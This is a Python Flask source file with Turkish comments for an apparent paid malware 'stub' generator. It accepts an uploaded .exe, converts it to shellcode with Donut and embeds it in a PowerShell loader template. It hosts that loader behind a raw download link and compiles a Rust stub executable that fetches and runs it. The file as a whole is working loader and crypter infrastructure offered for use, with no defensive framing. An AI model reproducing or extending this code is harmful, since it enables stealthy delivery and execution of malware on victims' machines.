import os
import json
import donut
import tempfile
import shutil
import subprocess
from flask import Flask, request, jsonify, send_file

app = Flask(__name__)

# Ayarlar
UPLOAD_FOLDER = "stubs/main"
USERS_FILE = "db/users.json"
TEMPLATE_FILE = "templates/ps_template.ps1"
ALLOWED_EXTENSIONS = {"exe"}

os.makedirs(UPLOAD_FOLDER, exist_ok=True)

def load_users():
    if not os.path.exists(USERS_FILE):
        return {}
    with open(USERS_FILE, "r") as f:
        return json.load(f)

def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

def get_next_ps_filename(user_id):
    """Sıradaki PS dosya numarasını bul"""
    user_ps_dir = f"stubs/{user_id}/ps"
    os.makedirs(user_ps_dir, exist_ok=True)
    
    existing_files = [f for f in os.listdir(user_ps_dir) if f.startswith("ps") and f.endswith(".ps1")]
    if not existing_files:
        return "ps1.ps1"
    
    numbers = [int(f[2:-4]) for f in existing_files if f[2:-4].isdigit()]
    next_num = max(numbers) + 1 if numbers else 1
    return f"ps{next_num}.ps1"

@app.route("/api/generator", methods=["POST"])
def generator():
    key = request.args.get("key")
    
    if not key:
        return jsonify({"error": "No key provided"}), 400

    users = load_users()
    if key not in users:
        return jsonify({"error": "Invalid API key"}), 403

    user_id = users[key]["id"]

    if "file" not in request.files:
        return jsonify({"error": "No file uploaded"}), 400

    file = request.files["file"]
    if not file or file.filename == "":
        return jsonify({"error": "Empty filename"}), 400

    if not allowed_file(file.filename):
        return jsonify({"error": "Only .exe files allowed"}), 400

    # EXE'yi kaydet
    filename = f"{user_id}.exe"
    save_path = os.path.join(UPLOAD_FOLDER, filename)
    file.save(save_path)

    # Donut ile shellcode oluştur
    shellcode = donut.create(file=save_path)
    
    # Shellcode'u PowerShell formatına çevir
    shellcode_hex = ",".join([f"0x{byte:02x}" for byte in shellcode])

    # Template'i oku ve placeholder'ı değiştir
    with open(TEMPLATE_FILE, "r") as f:
        template = f.read()

    ps_script = template.replace("{{SHELLCODE_PLACEHOLDER}}", shellcode_hex)

    # PowerShell scriptini kaydet
    ps_filename = get_next_ps_filename(user_id)
    ps_save_path = f"stubs/{user_id}/ps/{ps_filename}"
    os.makedirs(os.path.dirname(ps_save_path), exist_ok=True)
    
    with open(ps_save_path, "w") as f:
        f.write(ps_script)

    raw_link = f"http://127.0.0.1:5000/{user_id}/ps/{ps_filename}?raw_key={users[key]['raw_key']}"

    with tempfile.TemporaryDirectory() as temp_dir:
        temp_stub_path = os.path.join(temp_dir, "stub")
        shutil.copytree("templates/stub", temp_stub_path, ignore=shutil.ignore_patterns('target'))

        # Modify the main.rs file in the temporary directory
        stub_main_path = os.path.join(temp_stub_path, "src", "main.rs")
        with open(stub_main_path, "r") as f:
            stub_code = f.read()

        stub_code = stub_code.replace("REPLACE_ME_WITH_RAW_LINK", raw_link)

        with open(stub_main_path, "w") as f:
            f.write(stub_code)

        # Build the stub
        try:
            subprocess.run(["cargo", "build", "--release", "--target-dir", os.path.abspath("templates/stub/target")], cwd=temp_stub_path, check=True)
        except subprocess.CalledProcessError as e:
            return jsonify({"error": "Failed to build the stub", "details": str(e)}), 500

        # Move the compiled exe to the stubs folder
        user_exe_dir = f"stubs/{user_id}/exe"
        os.makedirs(user_exe_dir, exist_ok=True)

        built_exe_path = os.path.join("templates/stub/target/release", "rust_s.exe")
        new_exe_path = os.path.join(user_exe_dir, f"{user_id}.exe")

        if os.path.exists(built_exe_path):
            shutil.move(built_exe_path, new_exe_path)

    return jsonify({
        "status": "success",
        "message": "File processed successfully",
        "exe_saved_as": filename,
        "ps_saved_as": ps_filename,
        "ps_path": ps_save_path,
        "raw_link": raw_link
    })

@app.route("/<user_id>/ps/<ps_filename>")
def get_ps_script(user_id, ps_filename):
    """Raw key ile PowerShell scriptini görüntüle"""
    raw_key = request.args.get("raw_key")
    
    if not raw_key:
        return jsonify({"error": "No raw_key provided"}), 400

    users = load_users()
    
    # Kullanıcıyı raw_key ile bul
    user_found = False
    for user_data in users.values():
        if user_data.get("raw_key") == raw_key and user_data.get("id") == user_id:
            user_found = True
            break
    
    if not user_found:
        return jsonify({"error": "Invalid raw_key or user_id"}), 403

    ps_file_path = f"stubs/{user_id}/ps/{ps_filename}"
    
    if not os.path.exists(ps_file_path):
        return jsonify({"error": "PS script not found"}), 404

    # Raw text olarak döndür
    with open(ps_file_path, "r") as f:
        content = f.read()

    return content, 200, {'Content-Type': 'text/plain'}

if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5000, debug=True)